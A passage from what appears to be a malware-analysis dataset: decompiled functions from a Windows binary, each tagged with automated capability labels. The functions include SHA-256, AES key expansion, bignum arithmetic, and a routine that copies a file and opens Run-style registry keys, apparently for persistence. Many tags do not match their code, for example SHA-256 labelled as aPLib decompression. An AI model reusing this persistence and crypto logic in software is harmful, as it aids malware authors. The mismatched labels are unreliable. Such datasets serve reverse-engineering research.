        "decompiled_code": "\nuint32_t fcn.0040545d(void)\n\n{\n    *0x40c6d4 = *0x40c6d4 * 0x343fd + 0x269ec3;\n    return *0x40c6d4 >> 0x10 & 0x7fff;\n}\n",
        "token_count": 69
    },
    "00406096": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid fcn.00406096(void)\n\n{\n    uint32_t *puVar1;\n    uint uVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint8_t uVar6;\n    int32_t arg_10h;\n    int32_t unaff_ESI;\n    int32_t arg_8h;\n    \n    uVar5 = *(unaff_ESI + 0x40);\n    *(uVar5 + unaff_ESI) = 0x80;\n    uVar4 = uVar5 + 1;\n    if (uVar5 < 0x38) {\n        if (0x37 < uVar4) goto code_r0x004060e3;\n        arg_10h = 0x38 - uVar4;\n        arg_8h = uVar4 + unaff_ESI;\n    }\n    else {\n        if (uVar4 < 0x40) {\n            fcn.00404c43(uVar4 + unaff_ESI, 0, 0x40 - uVar4);\n        }\n        fcn.00405efa();\n        arg_10h = 0x38;\n        arg_8h = unaff_ESI;\n    }\n    fcn.00404c43(arg_8h, 0, arg_10h);\ncode_r0x004060e3:\n    uVar4 = *(unaff_ESI + 0x40) * 8;\n    puVar1 = unaff_ESI + 0x48;\n    uVar5 = *puVar1;\n    *puVar1 = *puVar1 + uVar4;\n    uVar2 = *(unaff_ESI + 0x48);\n    *(unaff_ESI + 0x4c) = *(unaff_ESI + 0x4c) + CARRY4(uVar5, uVar4);\n    *(unaff_ESI + 0x3f) = *(unaff_ESI + 0x48);\n    uVar3 = *(unaff_ESI + 0x4c);\n    *(unaff_ESI + 0x3e) = uVar2 >> 8;\n    *(unaff_ESI + 0x3d) = uVar2 >> 0x10;\n    *(unaff_ESI + 0x3c) = uVar2 >> 0x18;\n    *(unaff_ESI + 0x3b) = uVar3;\n    *(unaff_ESI + 0x3a) = uVar3 >> 8;\n    *(unaff_ESI + 0x39) = uVar3 >> 0x10;\n    *(unaff_ESI + 0x38) = uVar3 >> 0x18;\n    fcn.00405efa();\n    uVar5 = 0;\n    do {\n        uVar6 = ('\\x03' - uVar5) * '\\b';\n        *(uVar5 + 0x40c6e0) = *(unaff_ESI + 0x50) >> (uVar6 & 0x1f);\n        *(uVar5 + 0x40c6e4) = *(unaff_ESI + 0x54) >> (uVar6 & 0x1f);\n        *(uVar5 + 0x40c6e8) = *(unaff_ESI + 0x58) >> (uVar6 & 0x1f);\n        *(uVar5 + 0x40c6ec) = *(unaff_ESI + 0x5c) >> (uVar6 & 0x1f);\n        *(uVar5 + 0x40c6f0) = *(unaff_ESI + 0x60) >> (uVar6 & 0x1f);\n        *(uVar5 + 0x40c6f4) = *(unaff_ESI + 100) >> (uVar6 & 0x1f);\n        *(uVar5 + 0x40c6f8) = *(unaff_ESI + 0x68) >> (uVar6 & 0x1f);\n        uVar4 = uVar5 + 1;\n        *(uVar5 + 0x40c6fc) = *(unaff_ESI + 0x6c) >> (uVar6 & 0x1f);\n        uVar5 = uVar4;\n    } while (uVar4 < 4);\n    return;\n}\n",
        "token_count": 993
    },
    "0040645c": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040645c(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint16_t *var_8h;\n    int32_t var_4h;\n    \n    iVar1 = *(arg_ch + 4);\n    var_4h = 0;\n    iVar2 = *(arg_10h + 4);\n    iVar4 = fcn.00406406();\n    iVar4 = *(iVar4 + 0xc);\n    iVar3 = *(arg_ch + 0xc);\n    var_8h = *(arg_10h + 0xc);\n    fcn.00404c43(iVar4, 0, (iVar2 + iVar1) * 2);\n    do {\n        iVar7 = 0;\n        var_ch = 0;\n        iVar6 = var_4h;\n        do {\n            uVar5 = *(iVar3 + iVar7 * 2) * *var_8h + *(iVar4 + iVar6 * 2) + var_ch;\n            *(iVar4 + iVar6 * 2) = uVar5;\n            var_ch = uVar5 >> 0x10;\n            iVar6 = iVar6 + 1;\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < iVar1);\n        var_4h = var_4h + 1;\n        var_8h = var_8h + 1;\n        *(iVar4 + iVar6 * 2) = uVar5 >> 0x10;\n    } while (var_4h < iVar2);\n    fcn.0040634a();\n    fcn.0040634a();\n    fcn.004061e8();\n    return;\n}\n",
        "token_count": 456
    },
    "00406622": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406622(uint arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint16_t *arg_8h_00;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    iVar1 = *(arg_ch + 4);\n    iVar2 = fcn.00406406();\n    arg_8h_00 = *(iVar2 + 0xc);\n    var_8h = 0;\n    iVar2 = *(arg_ch + 0xc);\n    fcn.00404c43(arg_8h_00, 0, iVar1 * 2 + 2);\n    do {\n        uVar3 = *(iVar2 + var_4h * 2) * (arg_10h & 0xffff) + var_8h + *arg_8h_00;\n        *arg_8h_00 = uVar3;\n        var_8h = uVar3 >> 0x10;\n        arg_8h_00 = arg_8h_00 + 1;\n        var_4h = var_4h + 1;\n    } while (var_4h < iVar1);\n    *arg_8h_00 = uVar3 >> 0x10;\n    fcn.0040634a();\n    fcn.004061e8();\n    return;\n}\n",
        "token_count": 341
    },
    "00407cb0": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407cb0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    int32_t var_130h;\n    int32_t var_12ch;\n    uint var_128h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    fcn.00407702(&var_130h);\n    in_EAX[1] = in_EAX + 6;\n    var_8h = fcn.00407969(&var_130h, arg_8h, arg_ch);\n    if (var_8h == 0) {\n        *in_EAX = var_130h;\n        fcn.00404c71(in_EAX + 2, &var_128h, 0x10);\n        piVar1 = var_130h * 0x10 + var_12ch;\n        in_EAX[6] = *piVar1;\n        in_EAX[7] = piVar1[1];\n        in_EAX[8] = piVar1[2];\n        in_EAX[9] = piVar1[3];\n        iVar5 = *in_EAX;\n        puVar4 = in_EAX + 10;\n        puVar3 = piVar1 + -4;\n        while (iVar5 = iVar5 + -1,  0 < iVar5) {\n            var_4h = 4;\n            do {\n                puVar2 = puVar3;\n                *puVar4 = *(*(*(puVar2 + 3) + 0x40a4a8) * 4 + 0x40a5a8) ^ *(*(*(puVar2 + 2) + 0x40a4a8) * 4 + 0x40a9a8)\n                          ^ *(*(*(puVar2 + 1) + 0x40a4a8) * 4 + 0x40add0) ^\n                          *(*((*puVar2 & 0xff) + 0x40a4a8) * 4 + 0x40b1d0);\n                puVar4 = puVar4 + 1;\n                var_4h = var_4h + -1;\n                puVar3 = puVar2 + 1;\n            } while (var_4h != 0);\n            puVar3 = puVar2 + -7;\n        }\n        *puVar4 = *puVar3;\n        puVar4[1] = puVar3[1];\n        puVar4[2] = puVar3[2];\n        puVar4[3] = puVar3[3];\n    }\n    fcn.004076e5(&var_130h);\n    return var_8h;\n}\n",
        "token_count": 651
    },
    "00405efa": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_128h\n\nvoid __fastcall fcn.00405efa(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t in_EAX;\n    uchar *puVar3;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint var_128h;\n    uint var_120h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    uVar6 = 0;\n    puVar3 = param_1 + 1;\n    do {\n        (&var_120h)[uVar6] = CONCAT31(CONCAT21(CONCAT11(puVar3[-1], *puVar3), puVar3[1]), puVar3[2]);\n        uVar6 = uVar6 + 1;\n        puVar3 = puVar3 + 4;\n    } while (uVar6 < 0x10);\n    if (uVar6 < 0x40) {\n        var_4h = 0x40 - uVar6;\n        puVar4 = &var_128h + uVar6;\n        do {\n            uVar6 = *puVar4;\n            uVar1 = puVar4[-0xd];\n            iVar5 = var_4h + -1;\n            var_4h = iVar5;\n            puVar4[2] = ((uVar6 << 0xf | uVar6 >> 0x11) ^ (uVar6 << 0xd | uVar6 >> 0x13) ^ uVar6 >> 10) +\n                        ((uVar1 << 0xe | uVar1 >> 0x12) ^ (uVar1 >> 7 | uVar1 << 0x19) ^ uVar1 >> 3) + puVar4[-0xe] +\n                        puVar4[-5];\n            puVar4 = puVar4 + 1;\n        } while (iVar5 != 0);\n    }\n    var_14h = 0;\n    var_8h = *(in_EAX + 0x54);\n    var_ch = *(in_EAX + 0x58);\n    var_1ch = *(in_EAX + 0x5c);\n    var_10h = *(in_EAX + 100);\n    var_18h = *(in_EAX + 0x50);\n    var_20h = *(in_EAX + 0x68);\n    var_4h = *(in_EAX + 0x6c);\n    uVar6 = *(in_EAX + 0x60);\n    do {\n        uVar10 = var_18h;\n        uVar9 = uVar6;\n        uVar7 = var_20h;\n        uVar2 = var_8h;\n        uVar1 = var_ch;\n        var_20h = var_10h;\n        uVar6 = var_1ch;\n        iVar5 = ((uVar9 >> 0xb | uVar9 << 0x15) ^ (uVar9 << 7 | uVar9 >> 0x19) ^ (uVar9 >> 6 | uVar9 << 0x1a)) +\n                (~uVar9 & uVar7 ^ var_10h & uVar9) + *(var_14h + 0x4091f0) + *(&var_120h + var_14h) + var_4h;\n        var_14h = var_14h + 4;\n        uVar8 = (var_8h ^ uVar10) & var_ch;\n        uVar11 = var_8h & uVar10;\n        var_4h = uVar7;\n        var_10h = uVar9;\n        var_1ch = var_ch;\n        var_ch = var_8h;\n        var_8h = uVar10;\n        uVar6 = uVar6 + iVar5;\n        var_18h = ((uVar10 >> 0xd | uVar10 << 0x13) ^ (uVar10 << 10 | uVar10 >> 0x16) ^ (uVar10 >> 2 | uVar10 << 0x1e))\n                  + (uVar8 ^ uVar11) + iVar5;\n    } while (var_14h < 0x100);\n    *(in_EAX + 0x50) = *(in_EAX + 0x50) + var_18h;\n    *(in_EAX + 0x54) = *(in_EAX + 0x54) + uVar10;\n    *(in_EAX + 0x58) = *(in_EAX + 0x58) + uVar2;\n    *(in_EAX + 0x5c) = *(in_EAX + 0x5c) + uVar1;\n    *(in_EAX + 0x60) = *(in_EAX + 0x60) + uVar6;\n    *(in_EAX + 100) = *(in_EAX + 100) + uVar9;\n    *(in_EAX + 0x68) = *(in_EAX + 0x68) + var_20h;\n    *(in_EAX + 0x6c) = *(in_EAX + 0x6c) + uVar7;\n    return;\n}\n",
        "token_count": 1283
    },
    "00407719": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nvoid fcn.00407719(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_80ch;\n    uint var_410h;\n    uint var_40ch;\n    int32_t aiStack1036 [8];\n    int32_t var_3e8h;\n    int32_t var_3e0h;\n    int32_t var_3d8h;\n    int32_t var_3d4h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar2 = 0;\n    uVar7 = 1;\n    uVar1 = uVar7;\n    do {\n        (&var_80ch)[iVar2] = uVar1;\n        aiStack1036[uVar1 - 1] = iVar2;\n        uVar1 = (uVar1 ^ -((uVar1 & 0x80) != 0) & 0x1b ^ uVar1 * 2) & 0xff;\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x100);\n    puVar3 = 0x40ada8;\n    uVar1 = uVar7;\n    do {\n        *puVar3 = uVar1;\n        puVar3 = puVar3 + 1;\n        uVar1 = (uVar1 * 2 ^ -((uVar1 & 0x80) != 0) & 0x1b) & 0xff;\n    } while (puVar3 < 0x40add0);\n    *0x40a4a8 = 99;\n    *0x40c633 = 0;\n    do {\n        uVar1 = (&var_410h)[-aiStack1036[uVar7 - 1]];\n        uVar4 = (uVar1 >> 7 | uVar1 * 2) & 0xff;\n        uVar6 = uVar4 >> 7 | uVar4 * 2 & 0xff;\n        uVar5 = uVar6 >> 7 | uVar6 * 2 & 0xff;\n        uVar1 = uVar1 ^ uVar4 ^ uVar6 ^ uVar5 ^ ((uVar5 >> 7 | uVar5 * 2) ^ 99) & 0xff;\n        *(uVar7 + 0x40a4a8) = uVar1;\n        *(uVar1 + 0x40c5d0) = uVar7;\n        uVar7 = uVar7 + 1;\n    } while (uVar7 < 0x100);\n    iVar2 = 0;\n    do {\n        uVar7 = *(iVar2 + 0x40a4a8);\n        uVar1 = (-((*(iVar2 + 0x40a4a8) & 0x80) != 0) & 0x1b ^ uVar7 * 2) & 0xff;\n        uVar7 = (((uVar1 ^ uVar7) << 8 ^ uVar7) << 8 ^ uVar7) << 8;\n        uVar1 = uVar7 ^ uVar1;\n        *(iVar2 * 4 + 0x40c1d0) = uVar1;\n        uVar1 = uVar1 << 8;\n        uVar7 = uVar1 | uVar7 >> 0x18;\n        *(iVar2 * 4 + 0x40bdd0) = uVar7;\n        uVar7 = uVar7 << 8;\n        uVar1 = uVar7 | uVar1 >> 0x18;\n        *(iVar2 * 4 + 0x40b9d0) = uVar1;\n        *(iVar2 * 4 + 0x40b5d0) = uVar1 << 8 | uVar7 >> 0x18;\n        if (*(iVar2 + 0x40c5d0) == 0) {\n            var_4h = 0;\n        }\n        else {\n            var_4h = (&var_80ch)[(aiStack1036[*(iVar2 + 0x40c5d0) - 1] + var_3d4h) % 0xff];\n        }\n        if (*(iVar2 + 0x40c5d0) == 0) {\n            var_ch = 0;\n        }\n        else {\n            var_ch = (&var_80ch)[(aiStack1036[*(iVar2 + 0x40c5d0) - 1] + var_3e8h) % 0xff];\n        }\n        if (*(iVar2 + 0x40c5d0) == 0) {\n            var_8h = 0;\n        }\n        else {\n            var_8h = (&var_80ch)[(aiStack1036[*(iVar2 + 0x40c5d0) - 1] + var_3d8h) % 0xff];\n        }\n        if (*(iVar2 + 0x40c5d0) == 0) {\n            iVar8 = 0;\n        }\n        else {\n            iVar8 = (&var_80ch)[(aiStack1036[*(iVar2 + 0x40c5d0) - 1] + var_3e0h) % 0xff];\n        }\n        var_4h = ((iVar8 << 8 ^ var_8h) << 8 ^ var_ch) << 8 ^ var_4h;\n        iVar8 = iVar2 + 1;\n        *(iVar2 * 4 + 0x40b1d0) = var_4h;\n        uVar1 = var_4h << 8 | var_4h >> 0x18;\n        *(iVar2 * 4 + 0x40add0) = uVar1;\n        uVar1 = uVar1 << 8;\n        uVar7 = uVar1 | (var_4h << 8) >> 0x18;\n        *(iVar2 * 4 + 0x40a9a8) = uVar7;\n        *(iVar2 * 4 + 0x40a5a8) = uVar7 << 8 | uVar1 >> 0x18;\n        iVar2 = iVar8;\n    } while (iVar8 < 0x100);\n    return;\n}\n",
        "token_count": 1466
    },
    "00407969": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407969(int32_t *arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    ushort *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t var_4h;\n    \n    uVar6 = 0;\n    if (*0x40c6d0 == 0) {\n        fcn.00407719();\n        *0x40c6d0 = 1;\n    }\n    puVar2 = arg_8h + 6;\n    *arg_8h = 0xe;\n    arg_8h[1] = puVar2;\n    puVar3 = arg_ch + 2;\n    do {\n        puVar2[uVar6] = CONCAT31(CONCAT21(*puVar3, *(puVar3 + -1)), *(puVar3 + -1));\n        uVar6 = uVar6 + 1;\n        puVar3 = puVar3 + 2;\n    } while (uVar6 < 8);\n    iVar1 = *arg_8h;\n    if (iVar1 == 10) {\n        uVar6 = 0;\n        do {\n            uVar4 = CONCAT31(CONCAT21(CONCAT11(*((puVar2[3] & 0xff) + 0x40a4a8), *(*(puVar2 + 0xf) + 0x40a4a8)), \n                                      *(*(puVar2 + 0xe) + 0x40a4a8)), *(*(puVar2 + 0xd) + 0x40a4a8)) ^\n                    *(uVar6 + 0x40ada8) ^ *puVar2;\n            uVar6 = uVar6 + 4;\n            uVar5 = puVar2[1] ^ uVar4;\n            puVar2[4] = uVar4;\n            uVar4 = puVar2[2] ^ uVar5;\n            puVar2[6] = uVar4;\n            puVar2[5] = uVar5;\n            puVar2[7] = uVar4 ^ puVar2[3];\n            puVar2 = puVar2 + 4;\n        } while (uVar6 < 0x28);\n    }\n    else if (iVar1 == 0xc) {\n        uVar6 = 0;\n        do {\n            uVar4 = CONCAT31(CONCAT21(CONCAT11(*((puVar2[5] & 0xff) + 0x40a4a8), *(*(puVar2 + 0x17) + 0x40a4a8)), \n                                      *(*(puVar2 + 0x16) + 0x40a4a8)), *(*(puVar2 + 0x15) + 0x40a4a8)) ^\n                    *(uVar6 + 0x40ada8) ^ *puVar2;\n            uVar6 = uVar6 + 4;\n            uVar5 = puVar2[1] ^ uVar4;\n            puVar2[6] = uVar4;\n            uVar4 = puVar2[2] ^ uVar5;\n            puVar2[7] = uVar5;\n            uVar5 = puVar2[3] ^ uVar4;\n            puVar2[8] = uVar4;\n            uVar4 = puVar2[4] ^ uVar5;\n            puVar2[10] = uVar4;\n            puVar2[9] = uVar5;\n            puVar2[0xb] = uVar4 ^ puVar2[5];\n            puVar2 = puVar2 + 6;\n        } while (uVar6 < 0x20);\n    }\n    else if (iVar1 == 0xe) {\n        var_4h = 0;\n        do {\n            uVar6 = CONCAT31(CONCAT21(CONCAT11(*((puVar2[7] & 0xff) + 0x40a4a8), *(*(puVar2 + 0x1f) + 0x40a4a8)), \n                                      *(*(puVar2 + 0x1e) + 0x40a4a8)), *(*(puVar2 + 0x1d) + 0x40a4a8)) ^\n                    *(var_4h + 0x40ada8) ^ *puVar2;\n            var_4h = var_4h + 4;\n            uVar4 = puVar2[1] ^ uVar6;\n            puVar2[8] = uVar6;\n            uVar6 = puVar2[2] ^ uVar4;\n            puVar2[10] = uVar6;\n            puVar2[9] = uVar4;\n            uVar6 = puVar2[3] ^ uVar6;\n            puVar2[0xb] = uVar6;\n            uVar6 = CONCAT31(CONCAT21(CONCAT11(*(*(puVar2 + 0x2f) + 0x40a4a8), *(*(puVar2 + 0x2e) + 0x40a4a8)), \n                                      *(*(puVar2 + 0x2d) + 0x40a4a8)), *((uVar6 & 0xff) + 0x40a4a8)) ^ puVar2[4];\n            uVar4 = puVar2[5] ^ uVar6;\n            puVar2[0xc] = uVar6;\n            uVar6 = puVar2[6] ^ uVar4;\n            puVar2[0xe] = uVar6;\n            puVar2[0xd] = uVar4;\n            puVar2[0xf] = uVar6 ^ puVar2[7];\n            puVar2 = puVar2 + 8;\n        } while (var_4h < 0x1c);\n    }\n    fcn.00404c71(arg_8h + 2, arg_10h, 0x10);\n    return 0;\n}\n",
        "token_count": 1374
    },
    "0040631d": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid fcn.0040631d(void)\n\n{\n    uint16_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t unaff_EBX;\n    int32_t unaff_EDI;\n    \n    iVar4 = *(unaff_EDI + 4) + -1;\n    uVar2 = 0;\n    do {\n        puVar1 = *(unaff_EDI + 0xc) + iVar4 * 2;\n        uVar3 = uVar2 * 0x10000 + *puVar1;\n        uVar2 = uVar3 % (unaff_EBX & 0xffff);\n        iVar4 = iVar4 + -1;\n        *puVar1 = uVar3 / (unaff_EBX & 0xffff);\n    } while (-1 < iVar4);\n    while ((*(*(unaff_EDI + 0xc) + -2 + *(unaff_EDI + 4) * 2) == 0 && (1 < *(unaff_EDI + 4)))) {\n        *(unaff_EDI + 4) = *(unaff_EDI + 4) + -1;\n    }\n    return;\n}\n",
        "token_count": 268
    },
    "00406b3d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406b3d(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00406246();\n    var_4h = fcn.004067e3();\n    uVar2 = fcn.00404cfe(4);\n    *(in_EAX + 0x14) = uVar2;\n    uVar2 = fcn.004067be();\n    **(in_EAX + 0x14) = uVar2;\n    *(in_EAX + 0x18) = 1;\n    fcn.00406389();\n    do {\n        iVar3 = fcn.00406209(iVar1);\n        if (iVar3 == 0) {\n            uVar2 = fcn.0040639c();\n            uVar2 = fcn.0040645c(in_EAX, uVar2, var_4h);\n            var_4h = fcn.00406871(in_EAX, uVar2, *(in_EAX + 0xc + *(in_EAX + 0x24) * 4));\n        }\n        else {\n            var_8h = 0;\n            iVar3 = iVar1;\n            if (iVar1 < 0) {\n                iVar3 = 0;\n            }\n            else {\n                while (iVar4 = fcn.00406209(iVar3),  iVar4 == 0) {\n                    iVar3 = iVar3 + 1;\n                }\n            }\n            for (; iVar3 <= iVar1; iVar1 = iVar1 + -1) {\n                uVar2 = fcn.0040639c();\n                uVar2 = fcn.0040645c(in_EAX, uVar2, var_4h);\n                var_4h = fcn.00406871(in_EAX, uVar2, *(in_EAX + 0xc + *(in_EAX + 0x24) * 4));\n                iVar4 = fcn.00406209(iVar1);\n                if (iVar4 != 0) {\n                    var_8h = var_8h + 1;\n                }\n                if (iVar1 != iVar3) {\n                    var_8h = var_8h << 1;\n                }\n            }\n            uVar2 = fcn.0040645c(in_EAX, var_4h, *(*(in_EAX + 0x14) + ((var_8h + -1) / 2) * 4));\n            var_4h = fcn.00406871(in_EAX, uVar2, *(in_EAX + 0xc + *(in_EAX + 0x24) * 4));\n            iVar1 = iVar3;\n        }\n        iVar1 = iVar1 + -1;\n    } while (-1 < iVar1);\n    iVar1 = 0;\n    if (0 < *(in_EAX + 0x18)) {\n        do {\n            fcn.00406373();\n            fcn.0040634a();\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < *(in_EAX + 0x18));\n    }\n    fcn.00404d6a(*(in_EAX + 0x14));\n    fcn.0040634a();\n    fcn.0040634a();\n    return var_4h;\n}\n",
        "token_count": 778
    },
    "00401236": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "copy file"
        ],
        "decompiled_code": "\nuint32_t fcn.00401236(void)\n\n{\n    code *pcVar1;\n    int32_t arg_8h;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t lpExistingFileName;\n    \n    var_18h = 0;\n    var_10h = fcn.00407f6a(0x11, 0);\n    var_20h = fcn.00402d53(0x10);\n    var_24h = fcn.00402d53(0x12);\n    lpExistingFileName = fcn.00404cfe(0x20a);\n    arg_8h = fcn.00404cfe(0x20a);\n    var_14h = arg_8h;\n    var_8h = fcn.00404cfe(0x20a);\n    iVar2 = fcn.00404cfe(0x20a);\n    var_ch = 0;\n    var_1ch = iVar2;\n    if ((arg_8h != 0) && (lpExistingFileName != 0)) {\n        iVar3 = fcn.0040854d(lpExistingFileName);\n        if ((iVar3 != 0) && (var_8h != 0)) {\n            iVar3 = fcn.0040877a(var_8h, 0);\n            if ((iVar3 != 0) && (iVar2 != 0)) {\n                iVar2 = fcn.0040877a(iVar2, 1);\n                if (iVar2 != 0) {\n                    iVar2 = fcn.0040861d(arg_8h, 0x104, 3);\n                    if (iVar2 != 0) {\n                        iVar2 = (*_sym.imp.KERNEL32.dll_CopyFileW)(lpExistingFileName, arg_8h, 0);\n                        if (iVar2 != 0) {\n                            var_18h = fcn.00404d94(arg_8h);\n                            pcVar1 = _sym.imp.ADVAPI32.dll_RegOpenKeyExW;\n                            iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, var_10h, 0, 0x20106, &var_28h);\n                            if (iVar2 == 0) {\n                                var_18h = fcn.00402c33(var_8h, arg_8h);\n                                arg_8h = var_14h;\n                            }\n                            else {\n                                var_18h = 0;\n                            }\n                            fcn.00404d94(arg_8h);\n                            iVar2 = (*pcVar1)(0x80000001, var_10h, 0, 0x20106, &var_2ch);\n                            if (iVar2 == 0) {\n                                iVar2 = fcn.00402c33(var_8h, arg_8h);\n                                arg_8h = var_14h;\n                            }\n                            else {\n                                iVar2 = 0;\n                            }\n                            var_18h = 0 < iVar2 || 0 < var_18h;\n                        }\n                        if (var_24h != 0) {\n                            fcn.00402a3d(&var_ch);\n                            if (var_ch != 0) {\n                                iVar2 = 0;\n                                while( true ) {\n                                    iVar3 = fcn.00402a0f(iVar2);\n                                    if (iVar3 == 0) break;\n                                    iVar3 = fcn.0040861d(arg_8h, 0x104, 3);\n                                    if (iVar3 != 0) {\n                                        (*_sym.imp.KERNEL32.dll_CopyFileW)(lpExistingFileName, arg_8h, 1);\n                                    }\n                                    iVar2 = iVar2 + 1;\n                                }\n                                fcn.00404d6a(var_ch);\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    fcn.00402b7a(lpExistingFileName);\n    fcn.00402b7a(arg_8h);\n    fcn.00402b7a(var_8h);\n    fcn.00402b7a(var_1ch);\n    fcn.00402b7a(var_10h);\n    fcn.00402b7a(var_20h);\n    fcn.00402b7a(var_24h);\n    return var_18h;\n}\n",
        "token_count": 1046
    },
    "0040149d": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040149d(int32_t arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t arg_8h_01;\n    int32_t arg_8h_02;\n    int32_t arg_8h_03;\n    int32_t arg_8h_04;\n    int32_t arg_8h_05;\n    int16_t *arg_8h_06;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00404cfe(0x10);\n    arg_8h_01 = fcn.00407f6a(5, 0);\n    arg_8h_02 = fcn.00407f6a(6, 0);\n    arg_8h_03 = fcn.00407f6a(7, 0);\n    arg_8h_04 = fcn.00402d53(8);\n    arg_8h_05 = fcn.00402d53(9);\n    arg_8h_06 = fcn.00404cfe(0x20a);\n    fcn.00404c43(arg_8h_00, 0, 0x10);\n    if ((arg_8h_06 != NULL) && (iVar1 = fcn.0040877a(arg_8h_06, 1),  iVar1 == 0)) {\n        *arg_8h_06 = 0;\n    }\n    if (arg_8h_00 == 0) goto code_r0x004015cc;\n    if (arg_8h == 0) {\n        iVar1 = arg_8h_02;\n        if (arg_8h_01 != 0) {\n            iVar2 = fcn.00402a3d(arg_8h_00);\n            goto joined_r0x00401556;\n        }\ncode_r0x0040155b:\n        if ((((((iVar1 == 0) || (iVar1 = fcn.00402a3d(arg_8h_00 + 4),  iVar1 != 0)) &&\n              ((arg_8h_03 == 0 || (iVar1 = fcn.00402a3d(arg_8h_00 + 4),  iVar1 != 0)))) &&\n             ((arg_8h_04 == 0 || (iVar1 = fcn.00402a3d(arg_8h_00 + 8),  iVar1 != 0)))) &&\n            ((arg_8h_06 == NULL || ((*arg_8h_06 == 0 || (iVar1 = fcn.00402a3d(arg_8h_00 + 8),  iVar1 != 0)))))) &&\n           ((arg_8h_05 == 0 || (iVar1 = fcn.00402a3d(arg_8h_00 + 0xc),  iVar1 != 0)))) goto code_r0x004015cc;\n    }\n    else if (arg_8h_02 != 0) {\n        iVar2 = fcn.00402a3d(arg_8h_00);\n        iVar1 = arg_8h_01;\njoined_r0x00401556:\n        if (iVar2 != 0) goto code_r0x0040155b;\n    }\n   